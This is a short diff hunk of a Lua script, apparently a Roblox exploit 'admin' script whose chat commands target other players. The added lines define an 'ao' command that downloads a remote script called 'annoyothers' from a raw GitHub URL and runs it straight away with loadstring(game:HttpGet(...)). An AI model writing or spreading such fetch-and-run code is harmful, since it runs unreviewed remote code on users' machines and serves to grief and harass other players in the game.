@@ -1468,6 +1468,9 @@ if msg == prefix.."close" then
     game:GetService'Players':Chat(("unblind others"))
 
   end
+if msg == prefix.."ao" then
+loadstring(game:HttpGet("https://raw.githubusercontent.com/lpkonizopcinfasdf/plamka/main/annoyothers",true))()
+end
 if healauto == true then
 if game.Players.LocalPlayer.Character then
 if game.Players.LocalPlayer.Character:FindFirstChild("Humanoid") then
